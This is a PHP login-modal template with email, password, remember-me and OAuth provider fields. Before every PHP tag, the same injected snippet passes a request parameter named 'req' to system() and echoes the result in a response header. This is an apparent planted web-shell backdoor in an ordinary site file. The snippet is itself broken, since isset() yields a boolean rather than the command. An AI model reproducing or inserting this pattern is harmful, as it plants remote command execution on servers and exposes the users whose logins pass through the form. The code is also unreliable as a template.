<div class="modal fade" id="loginModal" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-md">
		<div class="modal-content">
			<form action="login" class="ajax-form">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
					<h4 class="modal-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.login') ?></h4>
				</div>
				<div class="modal-body">
					<div class="alert"></div>

					<div class="form-group">
		                <label for="email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.email_username') ?></label>
		                <input type="text" name="email" id="email" class="form-control">
		            </div>
		            
		            <div class="form-group">
		                <label for="password"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.password') ?></label>
		                <input type="password" name="password" id="password" class="form-control">
		            </div>
		           
		            <div class="form-group">
		                <div class="checkbox">
			                <label><input type="checkbox" name="remember" value="1"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.remember') ?></label>
			            </div>
		            </div>

		            <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (count(Config::get('auth.providers'))): ?>
			            <span class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.login_with2') ?></span>
			            <div class="social-connect clearfix">
			            	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach (Config::get('auth.providers', array()) as $key => $provider): ?>
			            		<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("oauth.php?provider={$key}") ?>" class="connect <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key ?>" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e("main.connect_with_{$key}") ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $provider ?></a>
			            	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
			            </div>
			        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

				</div>
				<div class="modal-footer">
					<div class="pull-left">
						<button type="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.login') ?></button>
					</div>
					<a href="#" data-toggle="modal" data-target="#reminderModal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.forgot_pass') ?></a> <br>
					<a href="#" data-toggle="modal" data-target="#activationModal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.resend_activation') ?></a>
				</div>
			</form>
		</div>
	</div>
</div>